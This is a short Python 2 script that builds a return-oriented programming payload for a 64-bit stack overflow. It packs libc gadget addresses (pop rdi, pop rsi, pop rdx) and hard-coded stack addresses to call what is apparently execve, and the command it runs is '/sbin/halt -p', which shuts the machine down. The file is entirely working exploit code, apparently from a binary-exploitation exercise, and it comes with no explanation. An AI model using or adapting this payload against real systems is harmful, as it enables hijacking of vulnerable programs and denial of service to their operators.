def pack(num):
	s = ""
	for i in range(8):
		s += chr(num%256)
		num = num//256
	return s

base = 0x00007ffff79e4000

string_loc  = 		 0x00007fffffffdf80

pop_rsi		= base + 0x0000000000023e6a
pop_rdi		= base + 0x000000000002155f
pop_rdx 	= base + 0x0000000000001b96
null_val    = '\x00\x00\x00\x00\x00\x00\x00\x00'

command = "/sbin/halt -p"
# command = "/bin/ls -l"
word = command.split()
p = word[0]+'\x00'*(16-len(word[0]))
p += word[1]+'\x00'*(16-len(word[1]))
p += pack(string_loc)
p += pack(string_loc+0x10)
p += null_val
p += '\x00'*(72-len(p))

p += pack(pop_rdi)
p += pack(string_loc)

p += pack(pop_rsi)
p += pack(string_loc+0x20)

p += pack(pop_rdx)
p += null_val

p += pack(base+0x00000000000e4e30)

print p